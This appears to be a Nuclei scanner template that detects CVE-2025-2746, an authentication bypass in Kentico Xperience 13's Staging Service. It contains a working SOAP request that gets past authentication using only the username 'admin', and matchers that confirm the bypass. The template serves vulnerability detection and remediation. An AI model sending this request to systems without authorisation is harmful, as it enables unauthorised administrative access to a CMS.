nuclei-v3/C/CVE-2025-2746.yaml

id: CVE-2025-2746
info:
  name: Kentico Xperience 13 CMS - Staging Service Authentication Bypass (WT-2025-0011)
  author: DhiyaneshDK
  severity: critical
  description: |
    Before Kentico Xperience 13 Hotfix 173, this vulnerability can be exploited with any username provided. For Hotfix >= 173 and < 178, this vulnerability can be exploited only if you provide a valid Staging Service username (default: admin)
  impact: |
    Unauthenticated attackers can bypass authentication in the Staging Service using any username (or valid username depending on hotfix version), potentially gaining control of administrative objects and compromising the entire CMS.
  remediation: |
    Upgrade to Kentico Xperience 13 Hotfix 178 or later that properly validates Staging Service authentication.
  reference:
    - https://github.com/watchtowrlabs/kentico-xperience13-AuthBypass-wt-2025-0011
    - https://devnet.kentico.com/download/hotfixes
    - https://labs.watchtowr.com/bypassing-authentication-like-its-the-90s-pre-auth-rce-chain-s-in-kentico-xperience-cms/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-2746
    cwe-id: CWE-287
    epss-score: 0.58431
    epss-percentile: 0.98986
  metadata:
    fofa-query: app="Kentico-CMS"
    max-request: 1
    verified: true
  tags: auth-bypass,cve,cve2025,kentico,kev,stag,vkev,vuln,xperience13
variables:
  rand: '{{to_lower(rand_text_alpha(32))}}'
http:
  - matchers:
      - condition: and
        part: body
        type: word
        words:
          - '{{rand}}'
          - <wsa:Action>
      - condition: or
        negative: true
        part: body
        type: word
        words:
          - Site not running
          - SyncServer.ErrorLicense
          - SyncServer.ErrorServiceNotEnabled
          - Staging service is not enabled on this server
          - Staging does not work with blank password
          - Missing X509 certificate token
          - The security token could not be authenticated or authorized
      - part: content_type
        type: word
        words:
          - text/xml
          # digest: 4b0a00483046022100de9e3b376963d6bddfa5ed44da1182a739855589a79fdeca164ffe09852578b1022100f88f27695696a37446c753aa4adffa56859d49a45b20c7f3ef786ec8c01e050f:922c64590222798bb761d5b6d8e72950
        # digest: 4b0a004830460221009ba0869951af54b3b324b7bc6c3404992e5e03f00ce8662643b19f2e5e200b50022100f2d9341a8d75448ee2b31c100968d6d2a165f065e4b8723da570e22b4e6309ca:922c64590222798bb761d5b6d8e72950
    matchers-condition: and
    raw:
      - |
        POST /CMSPages/Staging/SyncServer.asmx HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: text/xml; charset=utf-8
        SOAPAction: http://localhost/SyncWebService/SyncServer/ProcessSynchronizationTaskData

        <?xml version="1.0" encoding="utf-8"?>
            <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Header>
                    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
                        <wsse:UsernameToken>
                            <wsse:Username>admin</wsse:Username>
                        </wsse:UsernameToken>
                    </wsse:Security>
                </soap:Header>
                <soap:Body>
                    <ProcessSynchronizationTaskData xmlns="http://localhost/SyncWebService/SyncServer">
                        <stagingTaskData><![CDATA[<{{rand}}>]]></stagingTaskData>
                    </ProcessSynchronizationTaskData>
                </soap:Body>
            </soap:Envelope>
